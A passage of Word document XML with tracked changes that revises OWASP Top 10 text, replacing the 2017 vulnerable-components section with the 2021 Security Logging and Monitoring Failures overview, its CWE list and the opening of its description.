          <w:t>|:-------------:|:--------------------:|:--------------------:|:--------------:|:--------------:|:----------------------:|:---------------------:|:-------------------:|:------------:|</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5050A9CC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3146" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3147" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>| 4           | 19.23%             | 6.51%              | 6.87                 | 4.99                | 53.67%       | 39.97%       | 53,615            | 242        |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="418ECE53" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3148" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E8E307A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3149" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3150" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Overview</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4FE6887E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3151" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3427B53C" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3152" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Security </w:t>
      </w:r>
      <w:del w:id="3153" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Weakness           | Impacts               |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="72609CFB" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3154" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3155" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| -- | -- | -- |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7F732F62" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3156" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3157" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Access Lvl : Exploitability 2 | Prevalence 3 : Detectability 2 | Technical 2 : Business |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="00EDB984" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3158" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3159" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| While it is easy to find already-written exploits for many known vulnerabilities, other vulnerabilities require concentrated effort to develop a custom exploit. | Prevalence of this issue is very widespread. Component-heavy development patterns can lead to development teams not even understanding which components they use in their application or API, much less keeping them up to date. Some scanners such as retire.js help in detection, but determining exploitability requires additional effort. | While some known vulnerabilities lead to only minor impacts, some of the largest breaches to date have relied on exploiting known vulnerabilities in components. Depending on the assets you are protecting, perhaps this risk should be at the top of the list. |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3AF2BA9F" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3160" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="281C95D6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="3161" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3162" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## Is the Application Vulnerable?</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3163" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>logging</w:t>
        </w:r>
      </w:ins>
      <w:moveFromRangeStart w:id="3164" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923177"/>
    </w:p>
    <w:p w14:paraId="67BA4DF5" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3165" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="3166" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">You are </w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="3164"/>
      <w:del w:id="3167" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>likely vulnerable:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5A0F3140" w14:textId="472C6F73" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3168" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* If you do not know the versions of all components you use (both client-side</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:del w:id="3169" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>server-side). This includes components you directly use as well as nested dependencies.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3170" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>monitoring came from the Top 10 community survey (#3), up</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="13E1382C" w14:textId="0EBC72CF" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3171" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3172" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* If software</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3173" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>slightly from the tenth position in the OWASP Top 10 2017. Logging and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4234B43F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3174" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3175" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>monitoring can be challenging to test, often involving interviews or</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7AF39A91" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3176" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3177" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>asking if attacks were detected during a penetration test. There isn't</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6E7DAA07" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3178" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3179" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>much CVE/CVSS data for this category, but detecting and responding to</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="65F0CA66" w14:textId="6E8D357B" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3180" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3181" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>breaches</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="3182" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>vulnerable, unsupported, or out of date.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3183" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>critical. Still, it can be very impactful for accountability, visibility,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="61918EA2" w14:textId="3A49980F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3184" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3185" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>incident alerting, and forensics.</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> This </w:t>
      </w:r>
      <w:del w:id="3186" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>includes the OS, web/</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3187" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>category expands beyond *CWE-778</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2819C60D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3188" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3189" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Insufficient Logging* to include *CWE-117 Improper Output Neutralization</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7FCFBB75" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3190" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3191" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>for Logs*, *CWE-223 Omission of Security-relevant Information*, and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5F57766E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3192" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3193" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>*CWE-532* *Insertion of Sensitive Information into Log File*.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="39674EC6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3194" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B45E296" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3195" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3196" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Description</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="53127A78" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3197" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06F12F9B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3198" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3199" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Returning to the OWASP Top 10 2021, this category is to help detect,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6DBBF0E6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3200" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3201" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>escalate, and respond to active breaches. Without logging and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5E158C1B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3202" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3203" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>monitoring, breaches cannot be detected. Insufficient logging,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7BACDF04" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3204" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3205" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>detection, monitoring, and active response occurs any time:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="31F49C48" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3206" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="101C4B81" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3207" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3208" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Auditable events, such as logins, failed logins, and high-value</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="28894312" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
